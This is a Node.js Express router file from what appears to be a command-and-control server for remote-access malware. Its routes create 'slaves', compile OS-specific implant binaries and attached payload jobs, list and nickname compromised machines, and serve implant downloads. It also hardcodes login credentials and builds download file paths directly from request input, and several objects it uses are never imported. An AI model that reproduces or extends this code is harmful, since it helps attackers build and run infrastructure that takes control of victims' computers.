/**
 * Route for /client 
*/
const router = express.Router();
const fs = require("fs");
const userMiddleware = require("../../middlewares/UserMiddleware");

const implantGenerator = require("../../helpers/ImplantGeneratorHelper")
const payloadHelper = require("../../helpers/PayloadHelper")

router.post("/login", (req, res) => {

    const token = cryptoHelper.createID();
    if (serverOptions.useAuthentication) {

        if (req.body.username == "user" && req.body.password == "pass") {
            
            databaseHelper.saveAuthToken(token, req.body.username);
            res.json({token: token})

        } else {
            res.status(403).json({message: "Invalid credentails!"});
        }
    }
    else {
        databaseHelper.saveAuthToken(token, "anonymous");
        res.json({token: token})
    }
});

// Check if token is good.
router.get("/ping", userMiddleware.hasAuthToken, (req, res) => {
    res.json({message: "You're good"})
})

// Generate a new slave.
router.post("/slaves", userMiddleware.checkNewGeneration, (req, res) => {

    const newSlave = req.body;

    // Create new slave ID.
    const slaveId = cryptoHelper.createID();

    // Check if there is an onconnect payload.
    if (newSlave.payload) {

        // Create new job for the newly slave.
        const jobId = cryptoHelper.createID();
        const selectedPayload = databaseHelper.getPayloadById(newSlave.payload);

        payloadHelper.compilePayload(selectedPayload, jobId, newSlave.variables, (path, size) => {

            console.log("Compiled succesfully and generated new job")
            databaseHelper.addNewJob({
                id: jobId,
                slaveId: slaveId,
                payloadId: newSlave.payload,
                objectSize: size,
                location: path,
                variables: newSlave.variables
            })
        }, (err, compileError) => {

            if (compileError)
                res.status(400).json({message: "Compile error!", compileError: err});
            else
                res.status(400).json({message: err});
        })
    }

    // Generate implant based on OS.
    implantGenerator.generateImplant(slaveId, newSlave.os, (binaryPath) => {

        console.log("Generating implant success! path: " + binaryPath)
        res.json({path: binaryPath});
        
    }, (err, compileError = false) => {

        console.error("Generating implant failed!");
        if (compileError) 
            console.error("Due to compilation of binary!");
        console.error(err);

        if (compileError) 
            res.status(400).json({message: "Failed to compile new implant!", compileError: err});
        else
            res.status(400).json({message: err})
    })
})

// Retrieve all slaves.
router.get("/slaves", userMiddleware.hasAuthToken, (req, res) => {
    
    res.json(databaseHelper.getSlaves());
})

// Implant downloader.
router.get("/implant/:id", userMiddleware.hasAuthToken, (req, res) => {

    if (!req.params.id) {
        res.status(404).json({message: "No implant with this ID!"});
        return;
    }

    if (!fs.existsSync("./implants/" + req.params.id)) {
        res.status(404).json({message: "No implant with this ID!"})
        return;
    }

    res.download("./implants/" + req.params.id);
})

// Nickname an slave.
router.post("/slaves/nickname", userMiddleware.hasAuthToken, 
    userMiddleware.checkNickName, (req, res) => {
    
    databaseHelper.setNickname(req.body.slaveId, req.body.nickname);
    res.json({message: "Success"});
})

module.exports = router;